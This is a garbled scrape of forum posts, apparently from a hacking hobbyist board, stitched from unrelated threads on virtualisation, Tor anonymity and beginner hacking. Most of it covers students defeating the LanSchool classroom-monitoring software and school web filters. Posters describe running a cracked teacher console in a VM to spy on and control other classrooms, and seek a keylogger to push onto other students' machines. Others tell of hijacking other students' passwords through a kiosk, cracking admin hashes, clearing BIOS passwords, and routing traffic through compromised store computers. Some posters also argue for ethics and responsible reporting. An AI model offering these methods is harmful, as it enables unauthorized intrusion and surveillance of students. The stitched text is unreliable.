I am using the RAID on the Motherboard (0 and 1 is also available). \n\nI did a trail of Windows Server 2003, installed it, configured RAID 5 and it worked. Not sure if I want to use Windows Server 2003, not liking it. I was thinking Windows XP Pro x64 because there are drivers that support the motherboard support RAID 5.\n\nThose are my questions and thanks in advance for the input and suggestions!\n", "\nVaKo, I don't think I need something like that. I think I will be fine with what I have, plus I don't have the money =P. But thank you for your great suggestion!\n\n\n\n\nActually, I already have the equipment above built. But thanks for the hardware suggestions.\n\nThanks for suggesting the embedded hypervisor. I haven't considered that at all. I will look into it.\n\nAs for using RAID 5, I was thinking the same thing as you and originally I was going to use 10 (0,1) but my roommate insisted RAID 5 didn't have poor performance. Which doesn't make since when you look how RAID 5 works. (Also I don't like the fact I lose a good amount of space with RAID 5)\n\nThanks for confirming my thoughts. I will be switching to RAID 10.\n\nI am leaning towards VMware. I've used them all (Virtual Box, Virtual Server, and VMware). I've liked VMware the most thus far but it has been over a year.\n\nAlso here is a link as to what I am trying to do with this server\n\nhttp://hak5.org/forums/index.php?showtopic=12125\n\nThank you for the suggestions everyone. Keep them coming.\n\nUpdate:\n\n\n\nVaKo and stingwray, I think I am going to use VMware ESXi. It sounds like an excellent option for me and a free one! You two rock! THANKS again!

I think I will try a optimized linux OS for hypervisor. Any idea on that? I am going to continue my research. -Life is study-\n\nUpdate:\n\nI found oVirt which I believe is a project for an embedded hypervisor by red hat. It has some potential to work. It is in beta but I can get the installs. I will report back with more information later tonight on that.\n\nUpdate2: \n\noVirt isn't what I thought it was. It is a interesting idea but I don't need it for what I will be doing.\n\nLooks like I will try a Linux install, probably Fedora Core 10 or ubuntu with VMware.

I might have to go with a windows based system TT_TT. I've been doing my research on my motherboard and there isn't a lot of support out there for it's chipset and such in linux. Makes me very annoyed. I want to get RAID 0 to work but it doesn't see the volumes in ubuntu. I know I can get it to work if I don't use RAID but I want to use RAID so I might be force to use Windows Vista x64 or Windows XP x64. Very annoy!\n\nBut I am still going to dig deeper.

There are many different ways you can go, because hacking is a broad term.  There are network hacks, software hacks, etc.\nI know this is a bad answer, but if want to get a good foundation, the best thing to do is learn one of those two, if not both.  O'reilly has some great books out there on networking, as well as many good books on programming.  If you want to start dissecting software eventually and finding flaws in it, it's almost essential that you have a good understanding of C and assembly.  Then I would start digging into books like this.  Also, reading through exploit code can teach you a lot.  Check out milw0rm, Exploit Tree, and  Security Focus for some great exploit code.\nWith regards to networking, I would recommend picking up a few books on networking (Cisco, etc.) and see if you can find a few devices cheap on Ebay.  Then start picking them apart, and testing out hacks.  There are many good documents out there on packet forensics, and network flow.  I would really read up on how networks really work, eveyone knows the basic concept, but computer networks are incredibly sophisticated and there is a lot to learn.

Or you can just crash it.\n", "\nHey guys.\nI've been tinkering with my school comps for a year, and surprisingly, all my tech teachers are super interested (or they couldn't care less) in how I could fix this problem, since I'm not running around and crashing every computer I see. They run LanSchool 7.0.0.3, along with DeepFreeze, and they have a server which intercepts all traffic with the M86 Web Filter. Our firewall blocks off every open port except 80, 443 (SSL), and 796 (LanSchool). They have also disabled right clicking. (Bastards, I need to create a new folder.)\nThe DeepFreeze application is server sided, and so are our desktops and Windows XP profile settings. I found  h2oh4x!'s LanSchool Killer application extremely useful, and unplugging the LAN cable from the computers useful in making LanSchool nonresponsive.\nWhat I've found is that student.exe loads AFTER you log on the windows prompt. This means that the moment you log on, you can disconnect the LAN cable, making it a hard disk boot (instead of a defaulted network boot). I had to do this because they locked the BIOS so that you couldn't change the boot settings, so I had to force it to boot to Windows XP on the hard drive. However, you still can't access the lskdata.bin files (keylog files). The thing about this is that my school's LanSchool Teacher application is limited to viewing ONLY the classroom they're programmed on, and not anyone else. Because of the unplugging of the LAN cable, the computer boots from the default settings, including the default LanSchool settings. Although the student.exe is running, the teacher inside the class (or any other teacher account, for that matter), can't see you on the list of active computers. This also works if the teacher has limited USB drives, printing, web access, or any other restriction, as long as you pull out (the LAN cable, you gross bastards!) before the command to blank the screen/USB drives/printing is sent out by the teacher.\nJust for safety, I always run h2oh4x!'s LSKiller ;)\nHope this helps someone out from a teacher abusing LanSchool.\nAlso, I'm looking for the LanSchool decrypter files.

I'm doing this because it's interesting and I've found that it's a lot more complicated than I thought it was. This isn't to fuck stuff up for others, or screw with other people for \"shits and giggles\", but rather, it was interesting for me to find out about.\nmoving on to what I've found.\nOriginally, when I first started looking around computer systems, I thought that little icon in the corner (we use windows XP)was tracking our every move and blocking web sites.\nI also saw that there were two school networks, one for admins, and one for students. The admin network was named \"Network-A\", and the student one, subsequently, was named \"Network-S\". Logging in with student credentials didn't work for the admin network. I'm not sure if this matters.\nI found that our school uses LanSchool 7.2.0.3, and it's not updated to the latest version, 7.6.\nThis means that some programs created in the past /can/ exploit this program, and I've tested it on the school networks. I've been using ClassDoom (Google?) and it's just been destroying LanSchool. My school uses the program to monitor people while they're using the computer, and to keylog them.\nNot only do they use LanSchool, but they also use a web filter, called M86 (which I found today, after the school server which rerouted everything crashed and showed an error message).\nThey've blocked all non standard ports, except when you crash LanSchool, and that opens up port 796 so you can run some sort of VNC server on it - if you really wanted to.\nNow the other half of the truth was that they were using M86 Web Filtering and blocking Youtube, Facebook, and a shitload of other sites, some useful, some not. I noticed that they block all proxy sites (if they can help it), but sometimes super new ones don't get blocked. They block all VPN connections, but not FTP. They block Glype and PHProxy scripts, but I'm not sure how or what formula they use to do that. They haven't blocked Zelune yet, and I tried it on a free host today, which worked.\nI'm not sure what's next for me to try and find out, but I really want to see how the network is set up so I can learn more about it.\nIf you guys have any more ideas about this, I'd really like to hear them.\nI'm not really into the \"GO HACK GRADES NAO GO GO GO\", but I'd really like to see what I can do with my laptop (slow) and school computers (:\nThanks,\nSnuupy\n", "\n\n1.

The thing is, if we want to improve the school network to make it more secure, why aren't we allowed to poke around?\nI thought school was a place to learn and explore, so that you could learn more from it. Yes, we do have a \"tech\" class where you do almost nothing for half the time :S\nI hope my position about this is clear - I'm not trying to fuck stuff up, I just want to learn more about this, but if it's still suggested to not mess around with school networks, then I'll take that advice.\n", "\n\nWere you looking at their network with their permission the whole time? That's pretty awesome, how did you convince them to let you do that?\nIt's not my job, but I'd like to learn more about it if I can, and if it helps others on the way, all the better for me, and my school.\nCould you clarify on why you think that poking around the network - and not harming, touching, or breaking anything wouldn't be a good idea? It's like looking at someone else's car on the street while walking on the road, no police officer arrests you for that, unless you start vandalizing the car.\n", "\n\nWait, why would they ask you to \"do no harm to the integrity of the network upon expulsion and full punishment of the law\" if you weren't going to mess up their networks? Also, how is the information about the software private when the network names are listed out right in the open of the school and area, with their software and versions posted?\nVMWare and other virtualization tools are free,  but nothing's going to be the same as the school software and its combination of restrictions.\nOkay, well using the Hotel example - Guests /are/ allowed to look around their rooms and find out everything they have in that room. If they go into specific rooms, they would be charged, just like if you went on admin accounts, you would be charged as well. I wasn't going on files on another machine, I was looking around at the network and its policies and software. I haven't modified anything, copied, or \"hacked\" anything, except testing the LanSchool program that I found, where my teacher saw what I was doing.\n", "\n\nBut you weren't doing anything bad - so why would they be worrying?\nWhat's wrong with exploring the network if you don't harm it? Are they scared of the knowledge that someone else knows about stuff that only admins know?\n\nThe reason is very simple, you already know what the ins and outs of your school network are, you also know where the weakness are. You've tried to warn them about these security issues, but they have been negligent you take the matter into your own hands and decide to do a bit of poking around on the network only find that you managed to break into your schools principal computer.\nNow they find out it was you who did it, and they give you a warning stating that you shall not attempt to do any illegal activity ever again or face expulsion. Months passes and nothing has been done about the security breach, they haven't even patched the security hole.\nNow from this we can learn that, if you were a bad student and got expelled from school you could from outside hack into the schools system and still break into the principals computer.\nMoreover that's what they mean by this, there could be other reasons too but that's the only reason I can think for the moment.\n\n\nOkay, I get that, but why would they warn or discourage you from finding these holes? Shouldn't they WANT holes to be found so they can be as secure as possible? What if a black hat hacker comes around and hacks the shit out of them? The part I don't get is why I'm being told that administration doesn't want me to be finding weaknesses in the system. I mean, look at Apple. They block exploits every single time a new jailbreak is posted and made public. They update and fix holes every month or two. Shouldn't schools be doing that too? They're exposed to the public too.\nEdit: combined two posts to the first post\n", "\n--Double post, sorry--\n", "\n\nEven if we offer to fix it for them? (it's as simple as upgrading to a new version of LanSchool)\n\nIn my case they were ok with me poking around because that became my job. In your scenario however, it is not. Being in a situation where i have access and superior knowledge than the average user, they make every legal provision they can to assure i wont do harm. Its known as security for the institution hiring me. Would you want someone accessing your child's sensitive information? I think not. Just like at  bank's IT department. Everyone goes through a background check, drug test and other tests to assure they will not do anything malicious. Its all about what can and will happen, not what ifs.\n\n\nBut my child isn't publicly accessible. If there was a sickness in my baby, I'd want whoever found it to tell me too, so I could bring it to a doc and let it get fixed. Same thing for what I'm thinking here. I see a sickness in the network. If it's left open, can't /anybody else/ find that hole too?\n\nIn any situation coming from a network security standpoint you expect and prepare for the worst. The best way to prevent other children from hacking or damaging networks and accessing private files is to make an example of someone who DOES do such things. My junior year some smart alecs figured they'd make admin accounts on the domain. I caught this and they were carried off the grounds in handcuffs and ankle shackles. They were expelled, and when they returned to school the following year they were not allowed to work on any computer let alone be near one. \nAnd asking an adolescent that knows mostly how to break things to find holes is like encouraging a drug cartel to rob your store. You just don't do it.\nEDIT\n-------------\nInfiltrators example is flawless. Prevention is better than recovery.\n\n\nSo by making an example of the person that tries to help them find holes, they're kinda doing what Sony did of hackers to do things the PS3 couldn't do before? Suing them so that they'd make an \"example\" out of them, even when they made the console better? How does that make anything better or improved?\nI'm not breaking anything. At my school, they have a computers that just go back to normal EVEN if you could delete everything off of them. It's like their hard drives are frozen in one state. I'm not asking for the druggie to rob the store. It's like the druggie pointing out that the camera isn't monitoring a side of the wall, and that a simple move would fix that. No one (or me) is breaking anything or harming anything. That't not my goal.\n", "\n\nI wasn't going to hack in it, I was planning to explore the network - not to cause trouble.\n\nI was meaning your child as in his social security number, grades, files etc. In short, it takes a lot of clearance to do what we do and few people are willing to risk giving an adolescent access to said information. There was a lot of stuff i wasn't allowed to se even in the position i got.\n\n\nWhat stuff were you not allowed to see? I mean, grades and information about people, but computer related stuff weren't you allowed?\n\nApparently that's how things in IT can work sometimes, bad things have to happen, for someone to notice and take action. For instance, Sony was only concerned with making money and obviously not concerned with the security of their network in general. Moreover, someone from the outside had to teach them a lesson about security and that's what happened.\nThey lost millions of dollars, their reputation was put on the line and their clients might have lost their trust in them. Moral of the story, I think any person in charge of an IT system should have some experience with network security.\n\n\nSo I have to fuck my school network up before they'll let me fix it(or someone else)?\nI don't think my school's concerned with making money.

Sure, learn some programming languages and scripting skills, and grab some beginner's books on hacking, but go right away for it and set yourself a hacking lab within your own box, with a Kali VM as attacker and another VM as target, and explore various types of attacks. If interested in web attacks, looks at the OWASP Top Ten, check Troy Hunt's videos on Pluralsight for the basics of XSS/SQL injections and the like. Use a proxy like Burp Suite to craft some HTTP GETs and POSTs requests. If you prefer Wifi attacks, learn the ropes with Kismet, the aircrack-ng suite, and their automation with Wifite (all on Kali). Try some MiTM with tcpdump and Wireshark. Break some hashes with hashcat and some wordlists for dictionary attacks (rockyou.txt is a good start, and crackstation has a really huge wordlist). Then there are also attacks on Windows with privilege escalation, buffer overflows, DNS poisonning. Try some recon with Nmap, learn to use Nessus and Metasploit. That is only the beginning, but such techniques will give you a glimpse of all you can accomplish and motivate you to dig further.\n\u2202\u01b2\u03c2 \u2110\u2133 \u210b\u2202\u01b2\u03c2 \u2648,,\u2283~~  \n"], "Blunderboy\u00a0\u00a0": ["\nJust out of personal experience I would only use WinXP firewall if you have a hardware firewall in front of it.

You visit certain sites again and again, certain services of your computer may connect to sources in the internet and so on. Really to cover all aspects is very hard indeed. You can deactivate cookies, okay. Tails is trackable via browser information. I guess one has to generate a browser signature that has as less individual data as possible, meaning not to delete all entries but to see, what is the most common setting so there are lots of other users that use the same setting, too.\nThen as Cooper said, separating anonymous and non-anonymous activities is important (if possible at all). Theoretical for every website you could assign yourself a new IP address so a single IP assignement to you cannot collect enough data to classify it a fingerprint. You probaly also could do it the other way around and add fake behaviour to your normal web behaviour. This could be done by an automatically script that has a huge list of garbage websites and here and then sending requests there. I would not really trust the last solution as relevant data probably can become extracted by simple statistical analysis. If the websites you regularly visit stick out they have a pattern.

Give it a read.\nhttp://www.wired.com/vanish/2009/11/ff_vanish2/\nFortunately, while I was shocked by the intensity of the pursuit, I had anticipated the tactics. To keep my Web surfing from being tracked I often used a piece of free software called Tor, designed to protect the Internet activities of dissidents and whistleblowers around the world. Tor masks a computer\u2019s IP address by diverting its requests through designated routers around the world. So when I logged in to Gmail from IP 131.179.50.72 in Los Angeles, the logs showed my request originating from 192.251.226.206 in Germany.\nBut as my friend from Google had reminded me, no security is unbreakable, so I\u2019d added another layer: Vegas. I used the laptop I carried with me to log in remotely to my computers there, using free software from LogMeIn.com. The Vegas machines, in turn, were running Tor. Anyone clever enough to untangle those foreign routers would get only as far as a laptop sitting in an empty office on South Pecos Road.\nThe take away being to have a physical air gap somewhere along with another layer of remote access. Harkens back to the train station scene in Hackers where they have the payphones taped together.\n", "\n\nI agree, complacency seems to be the common thread in the people getting caught (the skilled ones anyway). Combine that with some ego and you're toast. As for having a dedicated office, that's not feasible, but there are other ways that could potentially accomplish the same effect. Just throwing out ideas off the top of my head, you could use a compromised computer at a big box store like BestBuy or have an old crappy laptop/netbook dead-dropped somewhere with a static IP, or a non-attributable VPS setup. Then just do the standard stuff already dead-horsed in this thread (TOR both ends before reaching the middle etc.)\n"], "ls\u00a0\u00a0": ["\nor you could use tor \n\nsometimes it's slow but it does the job\n"], "ACiDXeNo\u00a0\u00a0": ["\nHello all, Can someone please link the password list, I really don't want to download a 33gb rainbow table for a 5mb text file.

One of my funny as Teachers went on a bit of a power trip and was showing off his new found powers via this newly installed piece of software called Lanschool. Which I will admit was impressive and annoying from a student prospective.\n\nLanschool v7.2. In a nut shell equivocates to  VNC on steroids. It allows a teacher to view ever desktop in a class room from his Teacher Viewer client whilst permitting them to carry out some of the following features (some of these features can affect an entire class room and all of its students).\n\nLink: http://www.lanschool.com/lanschool/feature...ick-easy-access\n\n- Logging of Keystrokes.\n\n- Remote control of desktop.\n\n- Disabling the internet connection.\n\n- Shutting down the PC\n\n- Redirecting websites.\n\n- Locking the screen.\n\n- Displaying the teachers desktop on all students class room desktops.\n\n- Hosting a chat session\n\n- The list goes on and on..................... \n\nAnyways me and a fellow class mate spent most of our project management class trying  find a way to disable it so the teacher couldn't do any of the above (we enjoy our free mass downloading). I will admit it was a sod and I do MEAN SOD to try and remove with your limited student access, mandatory profile and our some what limited computer knowledge. In the end we worked out how to remove it, but obviously it comes back when you log off due to the mandatory profile (still its better than nothing). \n\nWe also had a bit of a fiddle and tried to obtain the same powers our teacher was demonstrating, sure enough we managed to find a work around and that work around allowed us more than a single class room (it was so simple it was not funny, which is slightly worrying seeing as the two of us are no hackers). For the record after an hour of some cheap harmless laughs at the expense of fellow class mates we ended up reporting the issue to the school's IT department and demonstrated how we could virtually spy/shut down any class room. Oddly enough they didn't seem to interested and if there track record is anything to go by this issue wont be resolved until they get around to the next upgrade (but meh we tried to do the right thing). \n\nI know this piece of software is some what popular among Tafe's and high school institutions(not sure about Universities) within Australia and I was curious if any of the folk in here have ever come across this software during there studies? \n\nAlso if any one is interested I don't mind posting a tutorial  for the above but before I do I wanna read the policy on here on what can be posted. I know the mod's have a anti How to hax0r yours skoolzorz policy which is fair enough and the last thing I wanna do is piss some of the people off in here.\n", "\nTo be honest I had no intention of posting to be a \"l33t little shite\" if I took that mentality why would I make reference and mention I am no hacker and have limited computer knowledge? Seriously give me some credit I at least had the decency to not give out information and inquire/do my own research about the policy in here prior to posting. \n\nI am well aware of the fact that system administrators congregate on this forum and as for posting technical detail on what I have done, like I mentioned in the above it was really simple, so simple in fact that it really isn't that technical (any idiot could do it, which could explain how we managed to fluke it). Well seeing as I am a fledgling 1st year Network student, I guess that rules me out on displaying it at a Systems Admin level. =P\n\nlol Now why would I go to the trouble of flaming your email? Do you have that affect on people?\n\nFYI I am an aussie we don't get upset to easily, the day I take offense to something said in a forum and feel the need to flame an email  account is the day I go out the back yard and play a quick game of hide and go neck myself.  The only exception would be when you English Folk take the ashes back off us shortly (god damn we are playing shit).\n\nBy the way thanks for posting the policy and saving me the searching, it is much appreciated.\n", "\nNah I never thought Vako was attacking in his post, I found it amusing for the most part and the rest was confusion on weather I should or should not post. \n\nThe initial post was some what cocked up on my part (sorry guys). Even I was not sure what I was trying to say with it. It was initially a  hey I found this silly flaw due to poor implementation but the IT department were like piss off you shit you are creating more work for us and it turned into a hey I would like to share because this is seriously stupid and I was hoping someone could roughly explain what you could do to stop it from a administrator prospective.\n\nAnyways due to my low level in I.T and the I.T department not telling us much on how things are setup and right fully so. Some of the below is based on my own assumptions. \n\nObviously there are groups for teachers/students and when a student log's in we get the server software loaded on login to the domain and the teachers get the viewer. Both groups have restrictions on not being able to install software or accessing the desktop to remove it. The teachers lan school viewer has a set channel number that loads for that class room and can not be changed unless it is re-installed hence teachers can not view other class rooms other than the one there desktop resides in.\n\nNow a class mate and I tried a whole bunch of different things to try and kill/remove it, in the end we worked out that we could remove the LAN school server that loaded on login if you got your hands on the installation file (mind you it was not easy finding the software and crack god bless rapid share). Yes it was that simple I couldn't believe it.\n\nThe next objective was to install the LAN school viewer the teachers were using to see if it would work, we couldn't do this in the host operating system so we thought hey we get to use VMware so why not try booting XP while bridging the network adapter and install it seeing as we have administrator rights in the guest O.S. (it worked a charm). We both also concluded that even if the school didn't provide us with the VMware application we could always just bring along our own laptop and theoretically it should work pretty much the same way.\n\nThe most amusing thing is each class room is linked via a channel number (1 to 250 if my memory is correct) this channel can only be set in the initial install process. So seeing as we have Administrator privileges within a virtual environment we could uninstall and reset the channel number to another class room on the next install (which is more than what the teachers can do).  \n\nPrior to installing the LAN school view software I was  expecting  some sort of password for teachers to access clients over the network, but nope nothing. From memory I didn't see anywhere within the programs install process/or the program itself that allows you to set a password. Now I could be wrong about this seeing as I did only have a fiddle for a short time (85% sure though) but I will take a good look tomorrow and confirm it.\n\nIt seems rather odd that the only security is your limited desktop access and the fact that only teachers get the LAN school viewer at login. As I mentioned in the above I am simply gob smacked at how easy it all was and if I was a malicious user god help all the students at my crappy tafe.\n\nMy humble apologizes that this isn't slightly more technical and more than likely not well written, I am trying to work on both of those aspects. XD\n", "\nlmfao Trust one of your guys to come up with a quick fix and here I was thinking that my method was really simple. /facepalm =P\n\nThanks a lot for the advice and the linkage Sparda your a gun and yeah I was planning on checking out what port and stuff it utilizes in my home lab running a sniffer. \n\nThanks Vako I am glad it gets your thumbs up. It seems our admins are pretty good and I am yet to be blocked from downloading stuff (some days I do go through a fair amount). Yeah they do restrict sites and unfortunately hak5 is one of em. A while ago I had a VPN setup so all was good but at the minute my network is a little chaotic and in need of repairs (band aid solutions for the moment). \n\nBy the way this maybe a silly question but how would one go about working out the network topology? My best guess is with nmap or something?\n", "\n\n\nThanks for that Vako I never knew the gui version could map out topologies, I have only ever had exposure to the CLI Linux stuff. Last time I tried to scan the schools network I am pretty sure the IDS kicked in and slammed the door in my face due to the large number of Syn's being sent. I shall be chucking that on my to check out list.\n\n\nDidnt his last post pretty much describe it?.. Well except maybe for the script loading from the server part. Don't see how you coulda changed those settings unless the admins were too lazy to lock it down.\nAnyone with that viewer could tap in. Shouldn't they have userids/passwrods or tie it into AD if the software can do that?\n\nAt the HS I went to you couldn't even right click windows.... what is it with these IT teams at schools now days?\n\n\nI though so to, the only thing I neglected to post was the link to download the LAN School software and the crack, reason being I neglected to send myself the link for the rapid share download during class (I was having a hard enough time hiding what I was doing from my teacher) and posting warez on here would surely equivalent to a breach of policy /instant flame.\n\nBut yeah if you only wanted to disable the app so teachers cant hijack your desktop Sparda's suggestion was far better than my own. If you wanted to be an annoying twat (not that I encourage it) all ya need is to know how to use VMware which is a piece of piss and doesn't require a guide IMHO.\n\nAgreed you shouldn't be able to tap in just because you have access to the software, as I mentioned I am pretty sure it doesn't have an option to support passwords and even if it did I guess it would mean a little more over head's for our schools IT department. I was going to confirm it today and have a better look at it but its 45 degrees here and I am suffering a bad case of CBF syndrome (I shall do it tomorrow).\n\nBy the way when you say AD do you mean active directory? (that went a little over my head).\n\nlol Yeah our Administrators like to be pretty tight on the level of desktop access we have (we can't right click either). On the funny side they do all this stuff and I have still found the odd oversight. \n\nWe have a computer in the library with a specific  purpose for changing your student login password. Its basically a Web browser only minus the Bar at the top for entering url's, back forward buttons etc. The same class mate who helped with the above and myself discovered that you could change any students password who previously changed there's. All you had to do was use a short cut for the back button on a web browser (alt and back arrow). Once that was done you had the students user ID, special word and a blank screen to input your new password. Granted they are only crappy limited user accounts but we could use that to access that student's email. The class mate I was working with in the above and I were discussing that we could create a batch file, to ping its loop back address to buy us time to leave a comp with the stolen student login, then get it to run a a crap load of net send commands (yes the admins didn't even disable that). In the end I talked my mate out of it because it is rather skiddy and whats the point of being an asshole who ruins someones day. We knew we could do it that was enough.\n\n\nI'll keep you guys posted if you want...\n\nplease do h@lo_foo I would be most interested as to who you tackled this project and how it all went.\n", "\n\n\nI couldn't agree more its stupidity like this that makes the rest of us average n00bs look bad. If there is one thing I love about the hak5 episode's and its community is it doesn't just arm you with technical know how but it also has strong emphases on the ethical side of things and having the correct mind set. Just because you can doesn't always mean you should. I don't get why anyone would wanna do damage to your schools network the saying  you don't shit where you sleep springs to mind.\n\nOut of curiosity seeing as you are a fellow Aussie and all do you or have you knocked around the Ausphreak community at all?\n\n\nMy teacher has this software at my college ccna/win2k3 server class, but he never uses it. it's more like his playtoy to either mess with or help others without getting up. It is a pretty cool ass program though (think about it. If you could get the software to run out side of the domain, you could have all your friends computers in view at all times *discarding weirdness and stalkery* so if they mess it up, it's all there in one interface...\nBTW, dont you think if your in a class of say 30 to 50 computers and that ONE computer or two is computers that are never visible on the software, you dont think the teacher is going to raise suspicion?\n\n\nYour CCNA teacher sounds exactly the same as mine, he only use's it for lending a hand or in the event he gets bored, he likes to take the piss the funny bastard. Actually my lack of student ID and my desktop in his viewer aroused suspicion when he was messing with the class, I just told him I unplugged my cable so you can't bother me which he responded with fuck your no fun. XD  \n\nYeah I was curious to know if the software works outside of the domain myself, that was one of the things I was planning on testing sometime next week if one of the guys bring in a laptop and the IT department haven't fixed it (which I highly doubt).\n", "\n\n\nThat is down right crazy DiggleBerries, it would be nice to save time booting a virtual machine. I will definetly check it out and hopefully I can get it all working. Thank you very muchly.\n\n\nthink that if you did some packet analysis you might be able to see how the computers communicate. If you can discover which packets are used to display your computer's desktop then, in theory, you could keep forwarding those packets to your teachers computer\n\nWOW I like where you are heading with this concept H@l0_f00, it would be pretty funky to get that working not to mention very educational. Unfortunitly I have no idea how you would tackel it. In any case its a brillant idea.\n\nBy the way dose Vision utilize a password for a teacher to connect to the student machines or is it like LAN school?\n\nLan School findings\n\nI took another look at the software today both on my home lan and via a google.\n\nPort Blocker:\n\nI first had a crack at Sparda's port listener/blocker suggestion (I used the program he kidly provided). Lan School runs on TCP port 796, now if I am in the teacher viewer watching the students desktop, the minute I block port 796 the teacher loses the displayed desktop connection and goes back to the computer name list when you first launch the program and the port listener turns its self off (WTF?). Then all the teacher has to do is click on the computer name and its back to viewing your desktop as normal. Also on the odd occasion the teacher view has crashed completely.\n\nI also did some reading after checking this out on the official Lan school page and they claim that even if you block a port with firewall LAN school still runs as per usually. Aparently this was a bug in older versions where students with a little to much desktop access would just install and block it in a firewall.  I guess this another one of those things I will add to the confirm list.\n\nPassword required?\n\nI had a really good look for an option to enable password both on the install process and in the options when install and I can confirm 100% that you can't set one (which works out well for students such as myself).\n\nI took the liberty of double checking Lan Schools official website and found the following:\n\nLinkage: http://www.lanschool.com/lanschool/technical-advantages\n\n\"f you suspect a student is using a unauthorized teacher console, you can quickly identify them with the security monitoring tool. It captures all LanSchool activity to a log file. There is also a \"secure\" version of LanSchool that requires teachers to enter a password to open the console.\"\n\nI suspect that the secure version with passworded connectivity would cost a little more and if your school has already purchased the unsecure version's license at $800 per class room, they will be in no hurry to do it all over again. Not to mention the time and effort required for the implamentation of the new software. \n\nKey Logger in LAN school\n\nAs I mentioned in the first post it comes with a inbuilt key logger. When Azza and I original got the teacher view working it was the first thing we checked out but unfortunitly it doesn't log jack all. I tried to test the logger on my own LAN today to see if it was some setting or something to do with the schools network. Unfortunitly I got the same thing and so did Azza when he tested it on his lan. My best guess is maybe this feature is a part of the secure version.\n\nAnyways it go me thinking, seeing as with LAN teacher you can upload files to the remote computer and execute programs from a path name I was wondering if anyone could suggest a deccent keylogger that has no install process (I was planning on googling it mysely but I decided to do this posting first).\n\nWhat if two Teachers are viewing?\n\nThis was one thing I was slightly concerned about, as it turns out both teachers are oblivous to eachothers presance. Kick ass!\n", "\n\n\nOne thing I will give to our Tafe's IT Department is they at least had the foresight to setup a bios password, however nothing was stopping me from cracking the case open while a teacher went out for a lengthy coffee break and remove the battery.\n\n\nI used to read their forums and stop bby their IRC a bit but haven't been back for ages. I have a terrible forum addiction and had to cull some back. Once I have boiled down my essential list, I might try and get involved there too\n\nlol I feel ya, I am an avid forum junky and try to keep things to a minimum myself. I figured as much every Aussie who is into comp security usually stops by Ausphreak once in there lives. I use to post on the forum and hang in the IRC channel about a year and a half ago, Not so proactive now but I still keep in touch with some of there members. \n\nFrom what I hear they aint so proactive now days, that greypages they setup was totally kick ass.\n\n\nThere's a an option to implement a password when you first install it but I'm not sure if it's used to protect people from using the program (running the .exe) or if it's used to secure the viewer to client connection (encryption, authentication, verification, etc.). I'll install a VM of XP to check out how the password is implemented\nSame here... Quite the mistake. I booted Ophcrack ASAP when I got to my new school this year and cracked the pass within seconds, it's \"envision\" WTF lol but I also think they should disable LM hash in the first place because there's nothing older than XP SP3, leaving LM hash to be only a security issue\n\n\nThanks for the heads up mate, if I get some time and my download speeds aint being a sod I may take a look at it sometime tomorrow. I am curious to see the difference between Vision and Lan School.\n\nLOL That would have blown a few peoples minds, I did this in class to recover a password for a VM machine of windows, IT department forgot the Administrator password, useless bastards. Funny thing was I didn't feel like working that day (hang over) and I wanted 5 minutes before lunch time before I announced I found the password. XD\n\nI tried the exact same thing for a Admin pass on a local machine to no avail, I suspect I need better rainbow tables than the default stuff supplied with Ophcrack.\n\nLastly seeing as some of the posters in here use LAN school and its almost back to school time I am interested to hear how other people went trying azza and I's work around.\n", "\n\n\nBelieve it or not, I suspect most will choose the later, I personally have no interest in myspaz, msn and other type accounts. The reason I asked is for two reason's \n\n1: I have 6 computers in my lab/4 in the main house and I was thinking about using the software on my one LAN (especially seeing as I have a couple of younger brothers).\n\n2: This week in class we are building a client server network, once its done our teacher is allowing us to break it and mess with eachother. Once done we have to try and secure it.\n\nBut yeah Dingle is right and that comment does fall in the Haxor me skoolzn type. Not my smartest post in here and sorry to debunk it into shitty-ness.\n", "\nJust a quick update\n\nI ended up having a crack at using Winsock Packet Editor Pro (inspired by H@l0_f00's great idea previously). The idea was to see if I could capture packets that executed commands from the teacher viewer and inject them into the student without using the Teacher viewing software console.  The result NO good, I ended up doing a search on google and I stumbled across a thread stating that they corrected this sort of thing since the previous versions. apparently some smarty pants had the same idea and had some java app that did the same thing (but actually worked). Well..... That is unless I cocked something up, but I am going to take another look some to later.\n\nAlso I found a nice reg edit that allows you to scan all the channels (1-255) from your Teacher viewer without the need to constantly install and uninstall. I have it floating around on USB somewhere but CBF going to get it. I shall post it a little later.\n\nLastly I tried a program (forget the name of it processor something or rather) but its basically a better version of task manager that kill's running processors, tried on LAN school with no luck. \n\n\n\n\nThank you so much for pointing that out and making me look like a complete tool, much appreciated *not to self read postings more thoroughly* XD\n\n\nI will note I only went to this level because I found some loopholes and the instructor, who took a great dislike to me for whatever reason, tried to pretty much rubbish me in front of the class.\n\nI got that some treatment last year, thankfully teaching this time around is much better.\n\nI bloody laughed at the conveniently placed backdoor. Tisk Tisk! Say what were you studying at tafe if you dont mind me asking. \n\n\nAt my old high school they used two. LanDesk and ABcontrol. once you had the server software for AB you could just run it and everything worked that easy with no password... Pretty dogey.\nEDIT: really usefull was sysinternals TCPView. try that to see connections to and from your PC and what is making them. one time I had it open and I saw AB connect and then the sysadmin sent a netsend like messege that said \"stop using it\" That was funny. hahaha\n\n\nLandesk and ABcontrol sound a lot like lan school, Geez you would think these developers would have better security measures.\n\nBwahahhaha Netsend like messages, that's gold.\n", "\nWell I am just glad that some good is to come of this and that theirs a system Admin in a school that is proactive in ensuring privacy for the end user. \n\nAs much as I respect and appreciate the hard work our school\u2019s ISS department do, I was a little pissed at the way they brushed us off when we first mentioned it (we were diplomatic and polite from the get go). \n\nThankfully my network security teacher was a former ISS department employee, so I decided to speak to him the following day, I also mentioned that I released it hoping he would relay the information again and the matter will be taken a little more seriously. \n\nSubsequently Azza and I had a good chat with our teacher and a different guy from ISS, they were talking about locking VMware somehow (lol they would say too much in front of us, not that I blame them). I also pointed out that a kind person by the name of Dingle suggested a USB key so you will have to do something about that one as well.\n\nIt\u2019s been a couple of days since then and I am not sure how they are tackling the problem but at least they are finally looking into it.\n\nTo be honest with you I was considering emailing the developer about the issue but figured they would most likely be aware of it and I only study the basics of networking security (more firewalls, topologies and the bare basics to MCSE) hence I am not exactly qualified.\n\nFeel free to take what Azza and I have found on here and follow it up with the Developer, if anybody will be taken seriously and have the knowledge/experience to make suggestions to improve the software surely its a Systems Admin from a school using it. \n\nThank you kindly for the praise and the suggestions, I will most certainly take it all on board and if there is a next time I shall follow your recommendations.\n\nA message to fellow students\n\nIf you are thinking about Pwning the school I have a better suggestion, how about you take the information provided here claim it as your own work (I personally do not care) and do as Manuel suggested, surely that will give you a bigger ego boost than shutting down a class room or messing with people for no apparent reason.\n\nP.S: special thanks to Dingle and H@l00 for the suggestions and Vako for being a understanding moderator.\n", "\n\n\nH@l00 you explained it perfectly fine the first time around (I should have been clearer in what I was trying to do with your idea). I 